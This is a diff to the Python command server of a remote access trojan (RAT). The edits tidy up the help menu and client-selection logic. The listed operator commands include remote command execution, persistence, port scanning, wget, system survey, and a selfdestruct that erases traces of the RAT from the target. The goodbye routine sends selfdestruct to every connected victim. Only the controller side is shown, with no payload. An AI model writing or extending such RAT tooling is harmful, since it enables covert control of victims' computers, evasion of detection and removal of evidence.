@@ -30,18 +30,19 @@ BANNER = '''
 CLIENT_COMMANDS = [ 'cat', 'execute', 'ls', 'persistence', 'pwd', 'scan',
                     'selfdestruct', 'survey', 'unzip', 'wget' ]
 HELP_TEXT = '''
+Command             - Description
+---------------------------------------------------------------------------
 cat <file>          - Output a file to the screen.
 client <id>         - Connect to a client.
 clients             - List connected clients.
 execute <command>   - Execute a command on the target.
-goodbye             - Exit the server and destroy all client connections.
+goodbye             - Exit the server and selfdestruct all clients.
 help                - Show this help menu.
 kill                - Kill the client connection.
 ls                  - List files in the current directory.
 persistence         - Apply persistence mechanism.
 pwd                 - Get the present working directory.
 quit                - Exit the server and keep all clients alive.
-rekey               - Regenerate crypto key.
 scan <ip>           - Scan top 25 TCP ports on a single host.
 selfdestruct        - Remove all traces of the RAT from the target system.
 survey              - Run a system survey.
@@ -98,9 +99,8 @@ class Server(threading.Thread):
     def select_client(self, client_id):
         try:
             self.current_client = self.clients[int(client_id)]
-            print 'Client {} selected.'.format(int(client_id))
+            print 'Client {} selected.'.format(client_id)
         except (KeyError, ValueError):
-            self.current_client = None
             print 'Error: Invalid Client ID.'
 
     def quit(self, _):
@@ -112,7 +112,7 @@ class Server(threading.Thread):
             sys.exit(0)
 
     def goodbye(self, _):
-        if raw_input('Exit the server and destroy all client connections (y/N)? ').startswith('y'):
+        if raw_input('Exit the server and selfdestruct all clients (y/N)? ').startswith('y'):
             for c in self.get_clients():
                 self.send_client('selfdestruct', c)
             self.s.shutdown(socket.SHUT_RDWR)
@@ -123,18 +123,16 @@ class Server(threading.Thread):
         self.send_client('kill', self.current_client)
         self.current_client.conn.close()
         self.remove_client(self.current_client.uid)
+        self.current_client = None
 
     def selfdestruct(self, _):
         self.send_client('selfdestruct', self.current_client)
         self.current_client.conn.close()
         self.remove_client(self.current_client.uid)
+        self.current_client = None
 
     def help(self, _):
         print HELP_TEXT
-
-    # rekey broken, will go in server_commands tho
-    #def rekey(self, _):
-    #    self.current_client.dhkey = diffiehellman(self.current_client.conn)
 
 
 class ClientConnection():
@@ -217,7 +215,7 @@ def main():
             server.recv_client(server.current_client)
 
         else:
-            print 'Invalid command, type "help" to se a list of commands.'
+            print 'Invalid command, type "help" to see a list of commands.'
 
 
 if __name__ == '__main__':
